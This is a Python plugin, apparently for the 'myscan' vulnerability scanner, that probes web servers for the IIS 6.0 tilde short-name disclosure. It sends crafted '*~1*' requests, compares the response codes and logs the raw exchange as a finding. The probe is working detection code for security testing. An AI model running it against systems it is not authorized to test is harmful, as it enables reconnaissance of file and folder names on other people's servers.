#!/usr/bin/env python3
# @Time    : 2020-02-17
# @Author  : caicai
# @File    : poc_iis_6.0_shortname.py
from myscan.config import scan_set
from myscan.lib.helper.request import request
from myscan.lib.parse.response_parser import response_parser


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "iis 6.0 shortname vuln"
        self.vulmsg = '''Microsoft IIS contains a flaw that may lead to an unauthorized information disclosure.
    The issue is triggered during the parsing of a request that contains a tilde character (~).
    This may allow a remote attacker to gain access to file and folder name information.'''
        self.level = 1  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 1)) + 2:
            return
        url1 = self.url + '*~1*/a.aspx'  # an existed file/folder
        url2 = self.url + 'l1j1e*~1*/a.aspx'  # not existed file/folder
        for method in ["GET", "OPTIONS"]:
            req1 = {
                "method": method,
                "url": url1,
                "headers": self.dictdata.get("request").get("headers"),  # 主要保留cookie等headers
                "timeout": 10,
                "verify": False,
            }
            req2 = {
                "method": "GET",
                "url": url2,
                "headers": self.dictdata.get("request").get("headers"),
                "timeout": 10,
                "verify": False,
            }

            r1 = request(**req1)
            r2 = request(**req2)
            if r1 != None and r2 != None and r1.status_code == 404 and r2.status_code != 404:
                parse_1=response_parser(r1)
                parse_2=response_parser(r2)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request_1":parse_1.getrequestraw(),
                        "response_1":parse_1.getresponseraw(),
                        "request_2": parse_2.getrequestraw(),
                        "response_2": parse_2.getresponseraw(),
                    }
                })
                break
